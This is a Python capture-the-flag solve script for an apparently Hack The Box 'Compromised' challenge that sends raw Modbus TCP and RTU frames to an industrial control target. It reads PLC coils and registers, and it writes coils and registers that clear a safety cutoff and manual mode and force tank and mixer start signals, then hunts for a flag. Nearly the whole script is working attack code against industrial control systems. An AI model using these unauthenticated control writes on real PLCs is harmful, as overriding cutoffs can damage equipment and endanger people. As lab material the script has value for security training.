#!/usr/bin/env python3
"""
HTB Compromised - FAST solve  (update IP/PORT before running)
Run immediately after Docker spawn, finishes in ~90 seconds.
"""
import socket, struct, time, select, sys

IP   = "154.57.164.76"
PORT = 30560

# ── helpers ──────────────────────────────────────────────────────────────────
def crc16(d):
    crc = 0xFFFF
    for b in d:
        crc ^= b
        for _ in range(8):
            crc = (crc>>1)^0xA001 if crc&1 else crc>>1
    return crc

def rtu(dev, fc, data):
    b = bytes([dev,fc])+data; return b+struct.pack("<H",crc16(b))

def tcp(unit, fc, data, tid=1):
    pdu=bytes([fc])+data
    return struct.pack(">HHHB",tid,0,1+len(pdu),unit)+pdu

def rd(a,n=1):  return struct.pack(">HH",a,n)
def wr(a,v):    return struct.pack(">HH",a,v)
def wc(a,on):   return struct.pack(">HH",a,0xFF00 if on else 0)

def sock():
    s=socket.socket(); s.settimeout(4); s.connect((IP,PORT))
    s.settimeout(0.5)
    try: s.recv(512)
    except: pass
    return s

def recv(s,tmo=8):
    buf=b""; dl=time.time()+tmo
    while time.time()<dl:
        r,_,_=select.select([s],[],[],min(dl-time.time(),0.3))
        if r:
            d=s.recv(4096)
            if not d: break
            buf+=d; time.sleep(0.05)
            r2,_,_=select.select([s],[],[],0.2)
            if r2:
                try: buf+=s.recv(4096)
                except: pass
            break
    return buf

def show(resp, label):
    if not resp: return False
    print(f"\n[!!!] GOT RESPONSE: {label}")
    print(f"      hex : {resp.hex()}")
    if len(resp)>9:
        pay=resp[9:]
        try:
            txt=pay.decode('latin-1')
            print(f"      text: {txt!r}")
            if 'HTB' in txt or '{' in txt:
                print(f"\n *** FLAG: {txt} ***")
        except: pass
        regs=[struct.unpack(">H",pay[i:i+2])[0] for i in range(0,len(pay)-1,2)]
        chars=''.join(chr(r) if 32<=r<127 else '.' for r in regs)
        print(f"      regs: {regs[:20]}")
        print(f"      char: {chars}")
        if 'HTB' in chars:
            print(f"\n *** FLAG: {chars} ***")
    return True

print(f"[*] {IP}:{PORT}")

# ── STEP 1: try pymodbus first (cleanest approach) ───────────────────────────
try:
    import importlib
    pm = importlib.import_module("pymodbus.client")
    ModbusTcpClient = pm.ModbusTcpClient
    print("[+] pymodbus found")

    for unit in [1, 2, 0xFF]:
        try:
            c = ModbusTcpClient(IP, port=PORT, timeout=10)
            if not c.connect():
                print(f"  pymodbus connect failed unit={unit}"); continue

            print(f"\n  [pymodbus unit={unit}]")
            # Try reading sensor coils first (identify PLCs)
            for addr, name in [(65,'WT1_highsens'),(64,'WT1_lowsens'),
                                (68,'MIX_highsens'),(67,'MIX_lowsens'),
                                (53,'WT1_start'),(45,'MIX_start')]:
                try:
                    r=c.read_coils(addr,count=1,slave=unit)
                    if not r.isError():
                        print(f"    coil {addr} ({name}) = {r.bits[0]}")
                    else:
                        # try old API
                        r=c.read_coils(addr,count=1,unit=unit)
                        if not r.isError():
                            print(f"    coil {addr} ({name}) = {r.bits[0]}")
                except Exception as e:
                    print(f"    coil {addr}: {e}")

            # Read holding regs (flag might be here)
            for start,count,desc in [(0,64,'regs 0-63'),(53,5,'regs 53-57'),(45,5,'regs 45-49')]:
                try:
                    r=c.read_holding_registers(start,count=count,slave=unit)
                    if not r.isError():
                        regs=list(r.registers)
                        print(f"    hold {desc}: {regs[:10]}")
                        chars=''.join(chr(v) if 32<=v<127 else '.' for v in regs)
                        if 'HTB' in chars or '{' in chars:
                            print(f" *** FLAG: {chars} ***")
                except Exception as e:
                    try:
                        r=c.read_holding_registers(start,count=count,unit=unit)
                        if not r.isError():
                            print(f"    hold {desc}: {list(r.registers[:10])}")
                    except: pass

            # Write fix
            print(f"\n  [write fix unit={unit}]")
            for addr,val,desc in [(206,False,"cutoff OFF"),(200,False,"manualmode OFF"),
                                   (53,True,"WT1 start ON"),(45,True,"MIX start ON"),
                                   (1234,True,"force_start_out ON")]:
                try:
                    try: r=c.write_coil(addr,val,slave=unit)
                    except TypeError: r=c.write_coil(addr,val,unit=unit)
                    print(f"    {desc}: {r}")
                except Exception as e:
                    print(f"    {desc}: {e}")

            time.sleep(3)

            # Read after fix
            for start,count in [(0,64),(100,64)]:
                try:
                    try: r=c.read_holding_registers(start,count=count,slave=unit)
                    except TypeError: r=c.read_holding_registers(start,count=count,unit=unit)
                    if not r.isError():
                        chars=''.join(chr(v) if 32<=v<127 else '.' for v in r.registers)
                        print(f"    post-write regs @{start}: {chars!r}")
                        if 'HTB' in chars:
                            print(f" *** FLAG: {chars} ***")
                except: pass

            c.close()
        except Exception as e:
            print(f"  pymodbus unit={unit} error: {e}")

except ImportError:
    print("[-] pymodbus not installed, using raw sockets only")

# ── STEP 2: raw socket - read EXACT PDF coil addresses (not coil 0!) ─────────
print(f"\n{'='*55}")
print(" RAW: read exact PDF coil addresses")
print(f"{'='*55}")
# PDF high_sensors should both be ON (tanks at 80%)
# Try THESE specific coils - we've been reading coil 0 which may not exist!
for unit in [1, 2, 3, 0xFF]:
    for fc, data, desc in [
        (0x01, rd(65,1),  f"FC01 coil 65  (WT1 high_sensor=ON?)"),
        (0x01, rd(68,1),  f"FC01 coil 68  (MIX high_sensor=ON?)"),
        (0x01, rd(64,1),  f"FC01 coil 64  (WT1 low_sensor)"),
        (0x01, rd(67,1),  f"FC01 coil 67  (MIX low_sensor)"),
        (0x01, rd(53,1),  f"FC01 coil 53  (WT1 start)"),
        (0x01, rd(45,1),  f"FC01 coil 45  (MIX start)"),
        (0x03, rd(0,64),  f"FC03 hold regs 0-63"),
    ]:
        try:
            s=sock(); s.send(tcp(unit,fc,data)); r=recv(s,tmo=5); s.close()
            if show(r, f"TCP unit={unit} {desc}"):
                sys.exit(0)
        except Exception as e:
            print(f"  [err] unit={unit} {desc}: {e}")
        time.sleep(0.1)

# ── STEP 3: Write + wait for push notification ────────────────────────────────
print(f"\n{'='*55}")
print(" RAW: Write fix sequence, wait 30s for pushed flag")
print(f"{'='*55}")

for unit_wt1, unit_mix in [(1,1),(1,2),(2,1)]:
    print(f"\n  [WT1=u{unit_wt1} Mix=u{unit_mix}]")
    try:
        s=sock()
        writes=[
            (unit_wt1,0x05,wc(206,False),"CLEAR cutoff"),
            (unit_wt1,0x05,wc(200,False),"CLEAR manual_mode"),
            (unit_wt1,0x05,wc(53,True), "SET WT1 start"),
            (unit_mix, 0x05,wc(45,True), "SET MIX start"),
            (unit_wt1,0x06,wr(206,0),   "REG CLEAR cutoff"),
            (unit_wt1,0x06,wr(53,1),    "REG SET WT1 start"),
            (unit_mix, 0x06,wr(45,1),   "REG SET MIX start"),
        ]
        for u,fc,data,desc in writes:
            f=tcp(u,fc,data); s.send(f)
            print(f"    {desc}: {f.hex()}")
            # Check for immediate echo/response
            r=recv(s,tmo=1)
            if r: show(r,f"write echo {desc}")
            time.sleep(0.2)

        print(f"  Waiting 30s for pushed flag...")
        r=recv(s,tmo=30)
        if r: show(r,"pushed flag response")
        else: print("  No push in 30s")
        s.close()
    except Exception as e:
        print(f"  Error: {e}")

# ── STEP 4: RTU+CRC format (server might need actual RTU) ─────────────────────
print(f"\n{'='*55}")
print(" RTU+CRC writes and reads")
print(f"{'='*55}")
try:
    s=sock()
    for dev,fc,data,desc in [
        (1,0x05,wc(206,False),"RTU CLEAR cutoff dev=1"),
        (1,0x05,wc(53,True),  "RTU SET WT1 start dev=1"),
        (1,0x05,wc(45,True),  "RTU SET MIX start dev=1"),
        (1,0x01,rd(65,1),     "RTU READ coil 65 dev=1"),
        (1,0x03,rd(0,64),     "RTU READ regs dev=1"),
    ]:
        f=rtu(dev,fc,data); s.send(f)
        print(f"  {desc}: {f.hex()}")
        r=recv(s,tmo=5)
        if r: show(r,desc)
        time.sleep(0.2)
    r=recv(s,tmo=10)
    if r: show(r,"RTU delayed response")
    s.close()
except Exception as e:
    print(f"  RTU error: {e}")

print("\n[*] Done. Paste full output for analysis.")

